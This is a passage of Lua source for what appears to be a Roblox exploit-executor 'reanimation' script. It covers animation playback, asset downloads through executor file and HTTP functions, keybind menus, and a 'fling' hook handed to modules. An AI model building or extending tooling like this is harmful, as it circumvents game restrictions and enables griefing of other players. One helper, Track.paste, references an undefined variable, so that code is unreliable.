	local NetVelSlider = UI.CreateSlider(MainPage, "Netless Velocity", Reanimate.NetlessVelocity, 25.01, 30, 0.1)
	NetVelSlider.Changed:Connect(function(val)
		val = math.clamp(val, 25.01, 30)
		NetVelSlider.Value = val
		Reanimate.NetlessVelocity = val
		SaveData.NetlessVelocity = val
	end)
	UI.CreateSwitch(MainPage, "Apply RotVelocity", Reanimate.UseAngularVelocity).Changed:Connect(function(val)
		Reanimate.UseAngularVelocity = val
		SaveData.UseAngularVelocity = val
	end)
end
UI.CreateSeparator(MainPage)

local AnimLib = {}
do
	local Track = {}
	function Track.frombuffer(buf)
		local needle = 0
		local buflen = buffer.len(buf)
		local function getleft()
			return buflen - needle
		end
		local function readstring()
			assert(getleft() >= 2)
			local len = buffer.readu16(buf, needle)
			needle += 2
			assert(getleft() >= len)
			local val = buffer.readstring(buf, needle, len)
			needle += len
			return val
		end
		local function readsizet()
			assert(getleft() >= 4)
			local val = buffer.readu32(buf, needle)
			needle += 4
			return val
		end
		local function readfloat()
			assert(getleft() >= 4)
			local val = buffer.readf32(buf, needle)
			needle += 4
			return val
		end
		local anim = {
			Name = "<unknown>",
			Time = 0,
			Keyframes = {},
		}
		anim.Name = readstring() -- name
		local nkeyframes = readsizet() -- # of keyframes
		for _=1, nkeyframes do
			local t = readfloat() -- time
			anim.Time = math.max(anim.Time, t)
			local nposes = readsizet() -- # of poses
			local keyframe = {
				Time = t,
				Poses = {}
			}
			for _=1, nposes do
				local pose = {}
				pose.Name = readstring() -- "bone" name
				pose.Weight = readfloat() -- weight (usually 1 or 0)
				pose.EasingStyle = readstring() -- EasingStyle
				pose.EasingDirection = readstring() -- EasingDirection
				pose.CFrame = CFrame.new(
					readfloat(),
					readfloat(),
					readfloat(),
					readfloat(),
					readfloat(),
					readfloat(),
					readfloat(),
					readfloat(),
					readfloat(),
					readfloat(),
					readfloat(),
					readfloat()
				) -- cframe
				table.insert(keyframe.Poses, pose)
			end
			table.insert(anim.Keyframes, keyframe)
		end
		-- sort by time for ez lookup
		table.sort(anim.Keyframes, function(a, b)
			return a.Time < b.Time
		end)
		return anim
	end
	function Track.fromfile(path)
		local s, data = pcall(readfile, path)
		if s and data then
			local buf = buffer.fromstring(data)
			return Track.frombuffer(buf)
		end
	end
	function Track.frominstance(ks)
		assert(ks and ks:IsA("KeyframeSequence"))
		local anim = {
			Name = "<unknown>",
			Time = 0,
			Keyframes = {},
		}
		anim.Name = ks.Name
		for _,k in ks:GetKeyframes() do
			local t = k.Time
			anim.Time = math.max(anim.Time, t)
			local keyframe = {
				Time = t,
				Poses = {}
			}
			for _,p in k:GetDescendants() do
				if not p:IsA("Pose") then continue end
				table.insert(keyframe.Poses, {
					Name = p.Name,
					Weight = p.Weight,
					EasingStyle = p.EasingStyle.Name,
					EasingDirection = p.EasingDirection.Name,
					CFrame = p.CFrame
				})
			end
			table.insert(anim.Keyframes, keyframe)
		end
		table.sort(anim.Keyframes, function(a, b)
			return a.Time < b.Time
		end)
		return anim
	end
	function Track.paste(target, source, timeoffset)
		for _,keyframe in source.Keyframes do
			local newkeyframe = DeepcopyTable(keyframe)
			newkeyframe.Time += timeoffset
			table.insert(target.Keyframes, newkeyframe)
		end
		anim.Time = 0
		table.sort(source.Keyframes, function(a, b)
			anim.Time = math.max(anim.Time, a.Time, b.Time)
			return a.Time < b.Time
		end)
	end
	function Track.getPoses(track, t, looped)
		-- not recommended for use on big anims
		local poses = {}
		local keyframes = track.Keyframes
		for _,keyframe in keyframes do
			for _,pose in keyframe.Poses do
				poses[pose.Name] = CFrame.identity
			end
		end
		if looped then
			t = t % track.Time
		end
		for name,_ in poses do
			local k1, k2, t1, t2 = nil, nil, -math.huge, math.huge
			for _,k in keyframes do
				local po = nil
				for _,p in k.Poses do
					if p.Name == name and p.Weight > 0 then
						po = p
					end
				end
				if po ~= nil then
					if t1 < k.Time and k.Time <= t then
						k1 = po
						t1 = k.Time
					end
					if t2 > k.Time and k.Time > t then
						k2 = po
						t2 = k.Time
					end
				end
			end
			local cf = CFrame.identity
			if k1 ~= nil then
				if k2 ~= nil then
					local a = (t - t1) / (t2 - t1)
					local es, ed = k1.EasingStyle, k1.EasingDirection
					if es == "Constant" then
						if ed == "In" then
							a = 1
						elseif ed == "Out" then
							a = 0
						else
							if a < 0.5 then
								a = 0
							else
								a = 1
							end
						end
					else
						if es == "CubicV2" then
							es = "Cubic"
						end
						a = TweenService:GetValue(
							a,
							Enum.EasingStyle[es],
							Enum.EasingDirection[ed]
						)
					end
					cf = k1.CFrame:Lerp(k2.CFrame, a)
				else
					cf = k1.CFrame
				end
			else
				if k2 ~= nil then
					cf = k2.CFrame
				end
			end
			poses[name] = cf
		end
		return poses
	end
	AnimLib.Track = Track
	local Animator = {}
	Animator.__index = Animator
	function Animator.new()
		local self = setmetatable({}, Animator)
		self.rig = nil
		self.track = nil
		self.map = {{0, 1}, {0, 1}}
		self.looped = false
		self.speed = 1
		self.weight = 1
		self._optimiser = 1
		self._jointmap = nil
		self._skipsec = nil
		self._rig = nil
		self._track = nil
		return self
	end
	function Animator:Step(t)
		local rig, track, map, speed, weight, looped = self.rig, self.track, self.map, self.speed, self.weight, self.looped
		local jointmap, skipsec = self._jointmap, self._skipsec
		if rig and track then
			local scale = rig:GetScale()
			t *= speed
			if map then
				t = map[2][1] + (t - map[1][1]) * (map[2][2] - map[2][1]) / (map[1][2] - map[1][1])
			end
			if self._rig ~= rig then
				jointmap = nil
				self._rig = rig
			end
			if self._track ~= track then
				skipsec = nil
				self._track = track
			end
			if not jointmap then
				jointmap = {}
				for _,v in rig:GetDescendants() do
					if v:IsA("Motor6D") and v.Part0 and v.Part1 then
						jointmap[v.Part1.Name] = v
					end
				end
				self._jointmap = jointmap
			end
			local keyframes = track.Keyframes
			if not skipsec then
				skipsec = {}
				local i = 1
				local oldsec = 0
				while i < #keyframes do
					local k = keyframes[i]
					local sec = k.Time // self._optimiser
					while oldsec < sec do
						local j = math.max(1, i - 1)
						local poses = {}
						local scan = j
						while scan > 0 do
							local k2 = keyframes[scan]
							local ok = true
							for name,_ in jointmap do
								if not poses[name] then
									for _,p in k2.Poses do
										if p.Name == name and p.Weight > 0 then
											poses[name] = true
											j = scan
											break
										end
									end
								end
								ok = poses[name] and ok
							end
							if ok then break end
							scan -= 1
						end
						table.insert(skipsec, {j, j})
						oldsec += 1
					end
					i += 1
				end
				for i,v in skipsec do
					while v[2] < #keyframes and keyframes[v[2]].Time <= (i + 1) * self._optimiser do
						v[2] += 1
					end
				end
				self._skipsec = skipsec
			end
			local poses = {}
			for name,_ in jointmap do
				poses[name] = CFrame.identity
			end
			if looped then
				t = t % track.Time
			end
			local skip1, skip2 = 1, #keyframes
			if #skipsec >= 2 then
				local i = t // self._optimiser
				if i < 1 then
					skip1, skip2 = 1, skipsec[1][2]
				elseif i < #skipsec then
					skip1, skip2 = skipsec[i][1], skipsec[i][2]
				else
					skip1, skip2 = skipsec[#skipsec][1], #keyframes
				end
			end
			for name,_ in poses do
				local k1, k2, t1, t2 = nil, nil, -math.huge, math.huge
				for i=skip1, skip2 do
					local k = keyframes[i]
					local po = nil
					for _,p in k.Poses do
						if p.Name == name and p.Weight > 0 then
							po = p
						end
					end
					if po ~= nil then
						if t1 < k.Time and k.Time <= t then
							k1 = po
							t1 = k.Time
						end
						if t2 > k.Time and k.Time > t then
							k2 = po
							t2 = k.Time
						end
					end
				end
				local cf = CFrame.identity
				if k1 ~= nil then
					if k2 ~= nil then
						local a = (t - t1) / (t2 - t1)
						local es, ed = k1.EasingStyle, k1.EasingDirection
						if es == "Constant" then
							if ed == "In" then
								a = 1
							elseif ed == "Out" then
								a = 0
							else
								if a < 0.5 then
									a = 0
								else
									a = 1
								end
							end
						else
							if es == "CubicV2" then
								es = "Cubic"
							end
							a = TweenService:GetValue(
								a,
								Enum.EasingStyle[es],
								Enum.EasingDirection[ed]
							)
						end
						cf = k1.CFrame:Lerp(k2.CFrame, a)
					else
						cf = k1.CFrame
					end
				else
					if k2 ~= nil then
						cf = k2.CFrame
					end
				end
				poses[name] = cf
			end
			for name,joint in jointmap do
				local cf = poses[name] or CFrame.identity
				cf = cf.Rotation + (cf.Position * scale)
				if weight == 1 then
					joint.Transform = cf
				elseif weight ~= 0 then
					joint.Transform = joint.Transform:Lerp(cf, weight)
				end
			end
		end
	end
	AnimLib.Animator = Animator
end
local function AssetGetPathFromFilename(filename)
	local filetype = "Unknown/"
	if filename:sub(-4, -1) == ".mp3" then
		filetype = "Sounds/"
	elseif filename:sub(-5, -1) == ".anim" then
		filetype = "Anims/"
	elseif filename:sub(-4, -1) == ".png" then
		filetype = "Images/"
	elseif filename:sub(-4, -1) == ".rbxm" then
		filetype = "Models/"
	end
	return "UhhhhhhReanim/Content/" .. filetype .. filename
end
local _Assetdownloading = {}
local _Assetdownloadingcount, _Assetdownloadingfail = 0, 0
local function _UpdateDownloadStatus()
	local prog = 1 / ((_Assetdownloadingcount + _Assetdownloadingfail) / 2 + 1)
	if _Assetdownloadingcount > 0 then
		Util.UINotify("Downloading " .. _Assetdownloadingcount .. " assets...", prog)
	else
		if _Assetdownloadingfail > 0 then
			Util.UINotify(_Assetdownloadingfail .. " failed to download", prog)
		else
			Util.UINotify("Asset download done", 1)
		end
	end
end
local function EnsureUrlEncode(source)
	return source:gsub("[^%w%-%._~/]", function(c)
		return string.format("%%%02X", string.byte(c))
	end)
end
local function AssetDownloadAgent(source, filename, path)
	if isfile(path) then return true end
	if _Assetdownloading[filename] then return false end
	_Assetdownloading[filename] = true
	task.spawn(function()
		_Assetdownloadingcount += 1
		_UpdateDownloadStatus()
		--Util.Notify("Downloading " .. filename .. "...")
		local s, resp = pcall(request, {
			Method = "GET",
			Url = source,
		})
		if s and resp and resp.StatusCode == 200 then
			_Assetdownloadingcount -= 1
			_UpdateDownloadStatus()
			pcall(writefile, path, resp.Body)
			task.wait(10)
		else
			_Assetdownloadingcount -= 1
			_Assetdownloadingfail += 1
			_UpdateDownloadStatus()
			--Util.Notify("Failed to download " .. filename .. "!")
			task.wait(10)
			_Assetdownloadingfail -= 1
			_UpdateDownloadStatus()
		end
		_Assetdownloading[filename] = nil
	end)
	return false
end
local function AssetDownload(filename)
	local source = "https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh/main/content/" .. EnsureUrlEncode(filename)
	local split = string.split(filename, "@")
	if #split > 1 then
		filename = table.remove(split, 1)
		source = table.concat(split, "@")
	end
	if source:sub(1, 7) == "MARKET/" then
		source = "https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh-Store/main/" .. EnsureUrlEncode(source:sub(8))
	end
	local path = AssetGetPathFromFilename(filename)
	return AssetDownloadAgent(source, filename, path)
end
local function AssetGetContentId(filename)
	local path = AssetGetPathFromFilename(filename)
	if not isfile(path) then return "" end
	local s, id = pcall(getcustomasset, path)
	if s and id then
		return id
	end
	return ""
end
local function AssetEnsure(list)
	local ok = true
	for _,filename in list do
		if not AssetDownload(filename) then
			ok = false
		end
	end
	return ok
end
local function ProtectedChat(content)
	pcall(function()
		TextChatService:FindFirstChildOfClass("ChatInputBarConfiguration").TargetTextChannel:SendAsync(content, Util.RandomString(64))
	end)
end
local OnPlayerChatted = Util.Instance("BindableEvent")
TextChatService.MessageReceived:Connect(function(message)
	if message.Status ~= Enum.TextChatMessageStatus.Sending and message.TextSource and message.TextSource.UserId then
		local plr, msg = Players:GetPlayerByUserId(message.TextSource.UserId), message.Text:gsub("&lt;", "<"):gsub("&gt;", ">"):gsub("&quot;", "\""):gsub("&apos;", "'"):gsub("&amp;", "&")
		if plr then
			OnPlayerChatted:Fire(plr, msg)
			if msg == "67" then
				Util.UINotify("SON :sob::sob::sob::sob:")
			end
			if msg == "1.1.0" then
				Util.UINotify("the overhaul update is real?")
			end
		end
	end
end)
task.wait()

local MovementStyles = {}
local DanceableDances = {}

local CurrentMovementStyle = nil
local MovementStyleIndex = 2
local _MovementStyleIndex = nil
local CurrentDance = nil
local _CurrentDance = nil
local OldReanimCharacter = nil

if type(SaveData.MovesetIndex) == "number" then
	MovementStyleIndex = SaveData.MovesetIndex
end

local MovesetsPage = UI.CreateItemListPage()
MovesetsPage.ZIndex = 1
MovesetsPage.Position = UDim2.new(0.5, 360, 0.5, 0)
MovesetsPage.Interactable = false
MovesetsPage.Visible = false
UI.CreateButton(MainPage, "Movesets &gt;", 20).Activated:Connect(function()
	MovesetsPage.Interactable = false
	MovesetsPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(MovesetsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MovesetsPage.Interactable = true
	end)
end)
MovesetsPage.Back.Activated:Connect(function()
	MovesetsPage.Interactable = false
	MovesetsPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(MovesetsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, 360, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MainPage.Interactable = true
		MovesetsPage.Visible = false
	end)
end)
local DancesPage = UI.CreateItemListPage()
DancesPage.ZIndex = 1
DancesPage.Position = UDim2.new(0.5, 360, 0.5, 0)
DancesPage.Interactable = false
DancesPage.Visible = false
UI.CreateButton(MainPage, "Dances &gt;", 20).Activated:Connect(function()
	DancesPage.Interactable = false
	DancesPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(DancesPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		DancesPage.Interactable = true
	end)
end)
DancesPage.Back.Activated:Connect(function()
	DancesPage.Interactable = false
	DancesPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(DancesPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, 360, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MainPage.Interactable = true
		DancesPage.Visible = false
	end)
end)
local KeybindsPage = UI.CreateItemListPage()
KeybindsPage.ZIndex = 1
KeybindsPage.Position = UDim2.new(0.5, 360, 0.5, 0)
KeybindsPage.Interactable = false
KeybindsPage.Visible = false
UI.CreateButton(MainPage, "Dance Keybinds &gt;", 20).Activated:Connect(function()
	KeybindsPage.Interactable = false
	KeybindsPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(KeybindsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		KeybindsPage.Interactable = true
	end)
end)
KeybindsPage.Back.Activated:Connect(function()
	KeybindsPage.Interactable = false
	KeybindsPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(KeybindsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, 360, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MainPage.Interactable = true
		KeybindsPage.Visible = false
	end)
end)
local MarketPage = UI.CreatePage()
MarketPage.ZIndex = 1
MarketPage.Position = UDim2.new(0.5, 360, 0.5, 0)
MarketPage.Interactable = false
MarketPage.Visible = false
UI.CreateButton(MainPage, (math.random() < 0.5 and "Store" or "Marketplace") .. " &gt;", 20).Activated:Connect(function()
	MarketPage.Interactable = false
	MarketPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(MarketPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MarketPage.Interactable = true
	end)
end)
UI.CreateButton(MarketPage, "&lt; Hurry back", 20).Activated:Connect(function()
	MarketPage.Interactable = false
	MarketPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(MarketPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, 360, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MainPage.Interactable = true
		MarketPage.Visible = false
	end)
end)
UI.CreateSeparator(MarketPage)

SaveData.KeybindsEnabled = not not SaveData.KeybindsEnabled
UI.CreateSwitch(MainPage, "Dance Keybinds Enabled", SaveData.KeybindsEnabled).Changed:Connect(function(val)
	SaveData.KeybindsEnabled = val
end)
local Keybinds = {}
local KeybindsPerPage = {"Z", "X", "C", "V", "B", "N", "G", "H", "J", "K", "L", "R", "T", "U", "P"}
local KeybindPaging = 0
local RefreshKeybinds = nil
local function HandleKeybind(key)
	if table.find(KeybindsPerPage, key) then
		if CurrentDance then
			CurrentDance = nil
			return true
		else
			CurrentDance = Keybinds[key]
			if CurrentDance then
				Util.UINotify(key .. " - " .. CurrentDance.Name)
				return true
			end
		end
	end
	if key == "M" then
		local pages = math.max(1, 1 + ((#DanceableDances - 1) // #KeybindsPerPage))
		KeybindPaging = (KeybindPaging + 1) % pages
		Util.UINotify("Page " .. (KeybindPaging + 1))
		RefreshKeybinds()
		return true
	end
	return false
end
RefreshKeybinds = function()
	local pages = math.max(1, 1 + ((#DanceableDances - 1) // #KeybindsPerPage))
	Util.ClearAllChildrenGui(KeybindsPage.List)
	local button = UI.CreateButton(KeybindsPage.List, "M - Page " .. (((KeybindPaging + 1) % pages) + 1), 20)
	button.Parent.Name = ""
	button.Activated:Connect(function()
		HandleKeybind("M")
	end)
	local indexoffset = KeybindPaging * #KeybindsPerPage
	for i=1, #KeybindsPerPage do
		local key = KeybindsPerPage[i]
		local index = indexoffset + i
		local dance = DanceableDances[index]
		Keybinds[key] = dance
		if dance then
			button = UI.CreateButton(KeybindsPage.List, key .. " - " .. dance.Name, 20)
			button.Parent.Name = key .. " " .. dance.Name
			button.Activated:Connect(function()
				HandleKeybind(key)
			end)
		end
	end
end
local ContextActions = {}
ContextActions._Actions = {}
ContextActions._ActionsMap = {}
do
	local buttonsui = Instance.new("Frame", SCREENGUI)
	buttonsui.BackgroundTransparency = 1
	buttonsui.Name = Util.RandomString()
	buttonsui.AnchorPoint = Vector2.new(0, 0)
	buttonsui.Position = UDim2.new(1, -90, 1, -90)
	buttonsui.Size = UDim2.new(0, 130, 0, 130)
	ContextActions._ButtonsGui = buttonsui
	local actions, actionsmap = ContextActions._Actions, ContextActions._ActionsMap
	function ContextActions:RunBinding(caac, input)
		local s, result = xpcall(caac.Callback, function(m)
			warn(debug.traceback("Uhhhhhh :: Custom ContextActions Error - " .. m))
		end, caac.Name, input.UserInputState, input)
		if s then
			if result == Enum.ContextActionResult.Sink then
				return true
			end
		end
		return false
	end
	function ContextActions:OnInput(input, gpe)
		if input.UserInputType ~= Enum.UserInputType.Keyboard then
			if gpe then return end
		end
		for i=#actions, 1, -1 do
			local caac = actions[i]
			local exec = false
			for _,v in caac.Inputs do
				if v == input.UserInputType then
					exec = true
					break
				end
				if input.UserInputType == Enum.UserInputType.Keyboard then
					if v == input.KeyCode then
						exec = true
						break
					end
				end
			end
			if exec then
				if ContextActions:RunBinding(caac, input) then return end
			end
		end
	end
	function ContextActions:UnbindAllActions()
		table.clear(actions)
		table.clear(actionsmap)
		ContextActions._ButtonsGui:ClearAllChildren()
	end
	function ContextActions:BindAction(name, callback, touchButton, ...)
		assert(type(name) == "string")
		assert(type(callback) == "function")
		assert(type(touchButton) == "boolean")
		ContextActions:UnbindAction(name)
		local caac = {
			Name = name,
			Callback = callback,
			Inputs = {...}
		}
		table.insert(actions, caac)
		actionsmap[name] = caac
		if touchButton then
			local button = Instance.new("ImageButton", buttonsui)
			button.Name = Util.RandomString()
			button.Position = UDim2.new(0, 0, 0, 0)
			button.Size = UDim2.new(0, 35, 0, 35)
			button.Image = "https://www.roblox.com/asset/?id=97166444"
			button.BackgroundTransparency = 1
			local txt = Instance.new("TextLabel", button)
			txt.Name = "Title"
			txt.Position = UDim2.new(0, 0, 0, 0)
			txt.Size = UDim2.new(1, 0, 1, 0)
			txt.BackgroundTransparency = 1
			txt.Font = Enum.Font.SourceSansBold
			txt.TextSize = 18
			txt.TextColor3 = Color3.new(1, 1, 1)
			txt.TextStrokeTransparency = 0
			txt.TextStrokeColor3 = Color3.new(0, 0, 0)
			txt.Text = ""
			local icon = Instance.new("ImageLabel", button)
			icon.Name = "Icon"
			icon.Position = UDim2.new(0, 0, 0, 0)
			icon.Size = UDim2.new(1, 0, 1, 0)
			icon.BackgroundTransparency = 1
			icon.Image = ""
			button.InputBegan:Connect(function(input)
				ContextActions:RunBinding(caac, input)
			end)
			button.InputChanged:Connect(function(input)
				ContextActions:RunBinding(caac, input)
			end)
			button.InputEnded:Connect(function(input)
				ContextActions:RunBinding(caac, input)
			end)
			caac.TouchButton = button
		end
	end
	function ContextActions:UnbindAction(name)
		local caac = actionsmap[name]
		if caac then
			if caac.TouchButton then
				caac.TouchButton:Destroy()
			end
			local i = table.find(actions, caac)
			if i then table.remove(actions, i) end
		end
	end
	function ContextActions:SetTitle(name, title)
		local caac = actionsmap[name]
		if caac then
			local button = caac.TouchButton
			if button then
				if button.Icon.Image == "" then
					button.Title.Visible = true
					button.Icon.Visible = false
				else
					button.Title.Visible = true
					button.Icon.Visible = false
				end
				button.Title.Text = title
			end
		end
	end
	function ContextActions:SetImage(name, image)
		local caac = actionsmap[name]
		if caac then
			local button = caac.TouchButton
			if button then
				if image then
					button.Icon.Image = image
				else
					button.Icon.Image = ""
				end
				if button.Icon.Image == "" then
					button.Title.Visible = true
					button.Icon.Visible = false
				else
					button.Title.Visible = true
					button.Icon.Visible = false
				end
			end
		end
	end
	function ContextActions:SetPosition(name, position)
		local caac = actionsmap[name]
		if caac then
			local button = caac.TouchButton
			if button then
				button.Position = position
			end
		end
	end
	AddToRenderStep(function()
		local playerGui = Player:FindFirstChildOfClass("PlayerGui")
		local touchGui = playerGui and playerGui:FindFirstChild("TouchGui")
		if not touchGui or not touchGui.Enabled then
			buttonsui.Visible = false
			return
		end
		local touchFrame = touchGui and touchGui:FindFirstChild("TouchControlFrame")
		local jumpButton = touchFrame and touchFrame:FindFirstChild("JumpButton")
		if not jumpButton then
			buttonsui.Visible = false
			return
		end
		local pos = jumpButton.AbsolutePosition - SCREENGUI.AbsolutePosition
		buttonsui.Visible = true
		buttonsui.Position = UDim2.fromOffset(pos.X - 35, pos.Y - 35)
	end)
end
UserInputService.InputBegan:Connect(function(input, gpe)
	if UserInputService:GetFocusedTextBox() then return end
	if SaveData.KeybindsEnabled then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			if HandleKeybind(input.KeyCode.Name) then return end
		end
	end
	ContextActions:OnInput(input, gpe)
end)
UserInputService.InputChanged:Connect(function(input, gpe)
	if UserInputService:GetFocusedTextBox() then return end
	ContextActions:OnInput(input, gpe)
end)
UserInputService.InputEnded:Connect(function(input, gpe)
	if UserInputService:GetFocusedTextBox() then return end
	ContextActions:OnInput(input, gpe)
end)

if type(SaveData.ModuleConfigs) ~= "table" then
	SaveData.ModuleConfigs = {}
end
local function GiveFunctionsToFunction(func)
	local env = b_getfenv(func)
	env.RandomString = Util.RandomString
	env.Util_CreateText = UI.CreateText
	env.Util_CreateButton = UI.CreateButton
	env.Util_CreateSwitch = UI.CreateSwitch
	env.Util_CreateTextbox = UI.CreateTextbox
	env.Util_CreateSlider = UI.CreateSlider
	env.Util_CreateDropdown = UI.CreateDropdown
	env.Util_CreateCanvas = UI.CreateCanvas
	env.Util_CreateScrollCanvas = UI.CreateScrollCanvas
	env.Util_CreateSeparator = UI.CreateSeparator
	env.ReanimCamera = Reanimate.Camera
	env.LimbReanimator = LimbReanimator
	env.HatReanimator = HatReanimator
	env.ReanimateShowHitboxes = ReanimateShowHitboxes
	env.ReanimateFling = ReanimateFling
	env.SetOverrideMovesetMusic = SetOverrideMovesetMusic
	env.GetOverrideMovesetMusicTime = GetOverrideMovesetMusicTime
	env.SetOverrideMovesetMusicTime = SetOverrideMovesetMusicTime
	env.SetOverrideMovesetMusicSpeed = SetOverrideMovesetMusicSpeed
	env.SetOverrideDanceMusic = SetOverrideDanceMusic
	env.GetOverrideDanceMusicTime = GetOverrideDanceMusicTime
	env.SetOverrideDanceMusicTime = SetOverrideDanceMusicTime
	env.SetOverrideDanceMusicSpeed = SetOverrideDanceMusicSpeed
	env.AnimLib = AnimLib
	env.ContextActions = ContextActions
	env.AssetGetPathFromFilename = AssetGetPathFromFilename
	env.AssetGetContentId = AssetGetContentId
	env.ProtectedChat = ProtectedChat
	env.OnPlayerChatted = OnPlayerChatted
	env.HiddenGui = SCREENGUI
	env.FallenPartsDestroyHeight = FallenPartsDestroyHeight
end
local function ClearModules()
	table.clear(MovementStyles)
	table.clear(DanceableDances)
	Util.ClearAllChildrenGui(MovesetsPage.List)
	Util.ClearAllChildrenGui(DancesPage.List)
	RefreshKeybinds()
end
local function GetModuleHash(m)
	if m.Hash then return m.Hash end
	local str = m.Name .. "somethingsomethingidkLOL:3:3:3:3" .. m.Description
	str = buffer.fromstring(string.rep(str, 8))
	local hash = {36, 91, 225, 10, 232, 117, 96, 243, 93, 128, 61, 97, 101, 120, 130, 69, 177, 80, 131, 27, 137, 242, 155, 245, 22, 123, 197, 145, 146, 206, 157, 20, 36, 91, 225, 10, 232, 117, 96, 243, 93, 128, 61, 97, 101, 120, 130, 69, 177, 80, 131, 27, 137, 242, 155, 245, 22, 123, 197, 145, 146, 206, 157, 20}
	local off = buffer.readu8(str, 0) % 64
	local l = buffer.len(str)
	for i=1, l do
		local j = ((off + i) % 64) + 1
		hash[j] = bit32.bxor(hash[j], buffer.readu8(str, i - 1)) % 256
	end
	str = ""
	local hex = {"0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"}
	for i=1, #hash do
		local x = hash[i]
		local a, b = x % 16, x // 16
		str ..= hex[b + 1] .. hex[a + 1]
	end
	m.Hash = str
	return str
end
local function AddMoveset(m)
	if type(m) == "table" then
		if not m.Name then return end
		if not m.Description then return end
		if not m.Config then return end
		if not m.Assets then return end
		if not m.Init then return end
		if not m.Update then return end
		if not m.Destroy then return end
		GetModuleHash(m)
		if m.LoadConfig then
			if SaveData.ModuleConfigs[m.Hash] then
				pcall(m.LoadConfig, SaveData.ModuleConfigs[m.Hash])
			end
		end
		table.insert(MovementStyles, m)
		local item = UI.CreateItemListItem(MovesetsPage.List)
		local msname = UI.CreateText(item, m.Name .. " &gt;", 20, Enum.TextXAlignment.Left)
		local msdesc = UI.CreateText(item, string.split(m.Description, "\n")[1], 12, Enum.TextXAlignment.Left)
		msname.Name = "LabelName"
		msdesc.Name = "LabelDesc"
		item.Parent.Name = m.Name .. " " .. m.Description
		Util.LinkDestroyI2C(item, item.Activated:Connect(function()
			local page = UI.CreatePage()
			page.ZIndex = 2
			page.Position = UDim2.new(0.5, 360, 0.5, 0)
			page.Interactable = false
			page.Visible = true
			UI.CreateButton(page, " &lt; Hurry back", 20).Activated:Connect(function()
				page.Interactable = false
				MovesetsPage.Interactable = false
				local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
					Position = UDim2.new(0.5, 360, 0.5, 0),
				})
				tween:Play()
				tween.Completed:Connect(function()
					MovesetsPage.Interactable = true
					page:Destroy()
				end)
			end)
			UI.CreateSeparator(page)
			UI.CreateText(page, m.Name, 20, Enum.TextXAlignment.Left)
			UI.CreateText(page, m.Description, 15, Enum.TextXAlignment.Left)
			local equip, equiptext = UI.CreateButton(page, "Use Moveset", 20)
			if MovementStyleIndex == table.find(MovementStyles, m) then
				equiptext.Text = "* ACTIVE *"
			end
			equip.Activated:Connect(function()
				equiptext.Text = "* ACTIVE *"
				MovementStyleIndex = table.find(MovementStyles, m)
			end)
			UI.CreateSeparator(page)
			UI.CreateText(page, "* Configuration *", 15, Enum.TextXAlignment.Center)
			m.Config(page)
			MovesetsPage.Interactable = false
			local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
				Position = UDim2.new(0.5, 0, 0.5, 0),
			})
			tween:Play()
			tween.Completed:Connect(function()
				page.Interactable = true
			end)
		end))
		return m.Name
	end
end
local function AddDance(m)
	if type(m) == "table" then
		if not m.Name then return end
		if not m.Description then return end
		if not m.Assets then return end
		if not m.Config then return end
		if not m.Init then return end
		if not m.Update then return end
		if not m.Destroy then return end
		GetModuleHash(m)
		if m.LoadConfig then
			if SaveData.ModuleConfigs[m.Hash] then
				pcall(m.LoadConfig, SaveData.ModuleConfigs[m.Hash])
			end
		end
		table.insert(DanceableDances, m)
		local item = UI.CreateItemListItem(DancesPage.List)
		local msname = UI.CreateText(item, m.Name .. " &gt;", 20, Enum.TextXAlignment.Left)
		local msdesc = UI.CreateText(item, string.split(m.Description, "\n")[1], 12, Enum.TextXAlignment.Left)
		msname.Name = "LabelName"
		msdesc.Name = "LabelDesc"
		item.Parent.Name = m.Name .. " " .. m.Description
		Util.LinkDestroyI2C(item, item.Activated:Connect(function()
			local page = UI.CreatePage()
			page.ZIndex = 2
			page.Position = UDim2.new(0.5, 360, 0.5, 0)
			page.Interactable = false
			page.Visible = true
			UI.CreateButton(page, " &lt; Hurry back", 20).Activated:Connect(function()
				page.Interactable = false
				DancesPage.Interactable = false
				local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
					Position = UDim2.new(0.5, 360, 0.5, 0),
				})
				tween:Play()
